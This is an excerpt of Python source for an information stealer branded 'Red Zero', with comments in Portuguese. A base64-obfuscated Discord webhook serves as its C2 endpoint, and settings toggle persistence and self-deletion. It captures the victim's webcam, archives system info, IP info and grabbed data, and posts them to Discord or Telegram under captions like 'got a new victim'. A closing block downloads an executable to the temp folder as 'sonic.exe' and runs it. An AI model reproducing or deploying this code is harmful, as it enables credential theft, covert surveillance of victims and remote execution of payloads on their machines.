...
class Settings:
    C2 = (0, base64.b64decode('aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTMxMjI3MjQ0NjI2NjU0MDE3Mi9nRnp4dm1ZaEZ0eWMzR05ZVVZSTzFTVFJuUTRsVG5TdWdBY2swUk1pZU1WSVF1U1NIcHZIUkozTVlBSFgzMlU2V1lDTw==').decode())
    Mutex = base64.b64decode('eFp6R21aMkw4R2hqNFZiRw==').decode()
    PingMe = bool('')
    Vmprotect = bool('')
    Startup = bool('')
    Melt = bool('')
...
Logger = logging.getLogger('Red Zero')
...
class Syscalls:
    ...
    def CaptureWebcam(index: int, filePath: str) -> bool:
        ...
        hcam = avicap32.capCreateCaptureWindowW(wintypes.LPWSTR('RedZero'), WS_CHILD, 0, 0, 0, 0, ctypes.windll.user32.GetDesktopWindow(), 0)
        result = False
        if hcam:
...
class RedZero:
    ...
    def CreateArchive(self) -> tuple[str, str]:
        ...
        if Utility.GetSelf()[1] or os.path.isfile(rarPath):
            ...
            if os.path.isfile(rarPath):
                password = Settings.ArchivePassword or 'RedZero'
    ...
    def SendData(self) -> None:
        ...
        filename = 'RedZero-%s.%s' % (os.getlogin(), extention)
        ...
        match Settings.C2[0]:
            case 0:
                image_url = 'https://i.pinimg.com/originals/7a/68/ad/7a68adb39caccd543ab164a1da9390b4.gif'
                payload = {'content': '||@everyone||' if Settings.PingMe else '', 'embeds': [{'title': 'RED ZERO', 'description': f'**__System Info__\n```autohotkey\n{system_info}```\n__IP Info__```prolog\n{ipinfo}```\n__Grabbed Info__```js\n{grabbedInfo}```**', 'url': 'https://github.com/BR/BlackRose', 'color': 16711680, 'footer': {'text': 'Robado por Red Zero | https://github.com/BR/RedZero'}, 'thumbnail': {'url': image_url}}], 'username': 'Red Zero', 'avatar_url': image_url}
            ...
            case 1:
                payload = {'caption': f'<b>Red Zero</b> got a new victim: <b>{os.getlogin()}</b>\n\n<b>IP Info</b>\n<code>{ipinfo}</code>\n\n<b>System Info</b>\n<code>{system_info}</code>\n\n<b>Informações Roubadas</b>\n<code>{grabbedInfo}</code>'.strip(), 'parse_mode': 'HTML'}
...
url = "https://github.com/hydralauncher/hydra/releases/download/v3.0.8/hydralauncher-3.0.8-portable.exe"

# Baixar o arquivo para a pasta temporária
response = requests.get(url)

# Verificar se o download foi bem-sucedido
if response.status_code == 200:
    # Caminho para salvar o arquivo com o nome "sonic.exe" na pasta temporária
    temp_file_path = os.path.join(tempfile.gettempdir(), "sonic.exe")

    # Salvar o conteúdo da resposta no arquivo temporário
    with open(temp_file_path, 'wb') as f:
        f.write(response.content)
    
    print(f"Arquivo baixado para: {temp_file_path}")

    # Tentar executar o arquivo com subprocess.run()
    try:
        # Executando o arquivo usando subprocess.run()
        subprocess.run([temp_file_path], check=True, shell=True)
